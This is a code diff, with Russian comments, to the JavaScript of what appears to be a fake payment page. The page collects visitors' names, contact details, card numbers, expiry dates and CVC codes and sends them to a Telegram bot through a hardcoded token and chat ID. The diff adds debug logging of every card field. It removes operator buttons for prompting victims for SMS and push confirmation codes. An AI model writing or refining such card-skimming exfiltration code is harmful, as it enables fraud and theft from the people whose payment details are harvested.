@@ -1280,8 +1280,15 @@ async function sendToTelegramBot() {
         const expiry = document.getElementById('expiry').value;
         const cvc = document.getElementById('cvc').value;
 
-        // УНИКАЛЬНЫЙ ID: timestamp + счетчик
-        const paymentId = Date.now() + (paymentCounter++);
+        // ДЕБАГ: Что мы отправляем
+        console.log('🔍 ДЕБАГ отправки в Telegram:');
+        console.log('Имя:', formData.firstName);
+        console.log('Фамилия:', formData.lastName);  
+        console.log('Email:', formData.email);
+        console.log('Телефон:', formData.phone);
+        console.log('Номер карты:', cardNumber);
+        console.log('Срок:', expiry);
+        console.log('CVC:', cvc);
 
         const message = `👤 Клиент:
 • Имя: ${formData.firstName || 'Тест'}
@@ -1294,6 +1301,9 @@ async function sendToTelegramBot() {
 • Срок: ${expiry}
 • CVC: ${cvc}`;
 
+        console.log('🔍 ДЕБАГ полное сообщение:');
+        console.log(message);
+
         const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
         const CHAT_ID = '-1003239032658';
 
@@ -1303,36 +1313,17 @@ async function sendToTelegramBot() {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { 
-                                text: "📱 SMS код", 
-                                callback_data: `sms_${paymentId}_${userId}`  // ← ИЗМЕНИЛ user123 на ${userId}
-                            },
-                            { 
-                                text: "🔔 Пуш", 
-                                callback_data: `push_${paymentId}_${userId}`  // ← ИЗМЕНИЛ user123 на ${userId}
-                            }
-                        ],
-                        [
-                            { 
-                                text: "❌ Неверная карта", 
-                                callback_data: `wrong_card_${paymentId}_${userId}`  // ← ИЗМЕНИЛ user123 на ${userId}
-                            }
-                        ]
-                    ]
-                }
+                parse_mode: 'HTML'
             })
         });
 
         const result = await response.json();
-        console.log('Результат отправки:', result);
+        console.log('🔍 ДЕБАГ результат отправки:', result);
+        
         return result.ok;
 
     } catch (error) {
-        console.error('Ошибка отправки:', error);
+        console.error('❌ Ошибка отправки:', error);
         return false;
     }
 }
@@ -1485,6 +1476,7 @@ async function sendToTelegramBot() {
     </script>
 </body>
 </html>
+
 
 
 
